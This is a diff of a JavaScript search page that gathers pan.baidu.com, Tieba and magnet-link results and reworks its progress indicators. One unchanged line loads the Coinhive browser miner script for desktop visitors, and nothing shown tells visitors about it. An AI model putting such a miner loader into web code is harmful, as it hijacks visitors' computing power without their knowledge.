@@ -68,10 +68,13 @@ function locationParameterChanged() {
     input.value=key;
     document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
     var sms = new String("sms:+13006248103?body=有 {0} 吗？");
-    document.getElementById("sms").href = sms.format(key);
+    var smsD =  document.getElementById("sms");
+    if(smsD){
+        smsD.href = sms.format(key);
+    }
     window.panc=pancFetcher(key);
-    window.panduoduo=panduoduoFetcher(key);
-    window.magnet=magnetFetcher(key);
+//     window.panduoduo=panduoduoFetcher(key);
+    magnetFetcher(key);
     window.tieba=tiebaFetcher(key);
     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
@@ -88,7 +91,9 @@ function loading(is,id){
 }
 function confirm(id,isImportant,data){
     try{
-        
+        if(!id){
+            confirm.innerHTML = "";
+        }
         var template = document.getElementById(id).innerHTML;
         var confirm;
         if(isImportant){
@@ -102,7 +107,7 @@ function confirm(id,isImportant,data){
             data = getURLParameter("search");
         }
         var html= template.format(data);
-        confirm.innerHTML = html;
+        confirm.innerHTML = "";
         if(id=="moreTemplate"){
             confirm.id = "confirm2";
         }
@@ -117,7 +122,7 @@ function confirm(id,isImportant,data){
 function ShowMore(){
 
     var length = window.showVideos.length;
-    var ways = [panc,panduoduo,tieba,magnet];
+    var ways = [panc,tieba,magnet,panduoduo];
 
 //     var ways = [panduoduo];
     if(length<1){
@@ -155,7 +160,10 @@ function fetcher(parameter){
     serf.fetchUrl = parameter.fetchUrl;
     serf.progress = innerProgress(serf.host,serf.fetchUrl);
     serf.parseVideos = parameter.parseVideos;
-    serf.setIframe = parameter.setIframe;
+    serf.setIframe = function (videos,length,showVideos){
+        parameter.setIframe(videos,length,showVideos);
+        serf.progress.setNum(serf.videos.length);
+    }
     serf.fetch = parameter.fetch;
     var success = function(html){
         var progress = serf.progress;
@@ -167,12 +175,13 @@ function fetcher(parameter){
         }
         progress.success(videos.length);
         serf.videos = videos;
-        if(!window.showVideos){
+        if(!window.showVideos&&serf.host!="panduoduo"){
             window.showVideos = [];
             serf.setIframe(serf.videos,1,window.showVideos);
-        }else if((serf.videos&&serf.videos[0].ref=="magnet")||(window.showVideos.length==1&&window.showVideos[0].ref=="magnet")){
-            serf.setIframe(serf.videos,1,window.showVideos);
         }
+//         else if((serf.videos&&serf.videos[0].ref=="magnet")||(window.showVideos.length==1&&window.showVideos[0].ref=="magnet")){
+//             serf.setIframe(serf.videos,1,window.showVideos);
+//         }
         html = null;
         
     };
@@ -267,7 +276,7 @@ function pancFetcher(key){
 
     parameter.parseVideos = function(html){
         var videos = parseHref(html,".a_url");
-        clearInvalid(videos);
+//         clearInvalid(videos);
         return videos;
 
         function parseHref(html,select){
@@ -301,7 +310,7 @@ function fetch(host,api,success){
         var error = function(){
             var videos = [];
             confirm("noneTemplate");
-            progress(host+'Progress').error();
+            progress(host).error();
 //             setIframe(videos,true,true);
         }
         ajax(url,success,error);
@@ -320,7 +329,7 @@ function nodeFetch(host,api,success){
         var error = function(){
             var videos = [];
             confirm("noneTemplate");
-            progress(host+'Progress').error();
+            progress(host).error();
 //             setIframe(videos,true,true);
         }
         ajax(url,success,error);
@@ -339,7 +348,7 @@ function cross(host,api,success){
         var error = function(){
             var videos = [];
             confirm("noneTemplate");
-            progress(host+'Progress').error();
+            progress(host).error();
 //             setIframe(videos,true,true);
         }
         ajax(url,success,error);
@@ -379,7 +388,7 @@ function setIframe(videos,isSrc,waitUrl,templateId) {
         
         dataBox.appendChild(wrapper);
     }
-    confirm("moreTemplate");
+    confirm("");
     dataBox = iframe = videos = null;
     return wrapper;
 }
@@ -598,7 +607,7 @@ function magnetFetcher(key){
         setIframe(videos,true,false,"magnetTemplate");
     }
     
-    return fetcher(parameter);
+    window[parameter.host] = fetcher(parameter);
 
 
     
@@ -617,30 +626,47 @@ function importScript (sSrc, fOnload) {
   oScript.src = sSrc;
 }
 
-function progress(id){
+function progress(host){
 
-    var _progress = document.getElementById(id);
+    var _progress = document.getElementById(host+'Progress');
     if(_progress.is_progress){
         return _progress;
     }
     _progress.is_progress = true;
     _progress.interval=setInterval(frame, 10);
     _progress.success=function(length){
+
+        _progress.classList=[];
         _progress.classList.add("success");
         clearInterval(_progress.interval);
         if(length){
-            appendHTML(_progress.nextSibling,"<em>("+length+")</em>");
+           _progress.nextSibling.innerHTML = "<em>"+length+"</em>";
         }
     };
+    _progress.setNum=function(length){
+        if(length>0){
+            _progress.success(length);
+        }else{
+            _progress.none();
+        }
+    }
     _progress.none = function(){
+        _progress.classList=[];
         _progress.classList.add("none");
         clearInterval(_progress.interval);
+        _progress.nextSibling.innerHTML = "<em>"+0+"</em>";
     }
     _progress.error = function(){
+        _progress.classList=[];
         _progress.classList.add("error");
         clearInterval(_progress.interval);
     }
-
+    _progress.nextSibling.onclick=function(){
+        var fetcher = window[host];
+        if(fetcher){
+            setMoreIframe([fetcher],0,fetcher.videos.length);
+        }
+    }
     function frame() {
         if (_progress.value >= 20000) {
             clearInterval(_progress.interval);
@@ -655,9 +681,9 @@ function progress(id){
 function innerProgress(host,fetchUrl){
     var progressGroup = document.getElementById("progressGroup");
     progressGroup.classList.add("show");
-    var html = '<li class="'+host+'"><a target="_blank" href="'+fetchUrl+'" title="'+host+'"><progress max="20000" id="'+host+'Progress"></progress><span>'+host+'<span></a>';
+    var html = '<li><a target="_blank" href="'+fetchUrl+'" title="'+host+'"><i class="'+host+'"></i></a><span class="more" href="javascript:return void()"><progress max="20000" id="'+host+'Progress"></progress><span></span></span>';
     appendHTML(progressGroup,html)
-    return progress(host+'Progress');
+    return progress(host);
 }
 function appendHTML(d,html){
     var wrapper= document.createElement('div');
@@ -790,7 +816,7 @@ function tiebaFetcher(key){
     parameter.parseVideos = function(html){
         var videos = parseHref(html,".s_post");
         
-        clearInvalid(videos);
+//         clearInvalid(videos);
         return videos;
 
         function parseHref(html,select){
@@ -811,7 +837,7 @@ function tiebaFetcher(key){
                 var name = string.slice(keyIndex);
                 var url = getUrl(string,keyIndex);
                 
-                if(url){
+                if(key&&url){
                     videos.push({name:string,url:url,refUrl:"http://tieba.baidu.com"+refUrl});
                 }
 
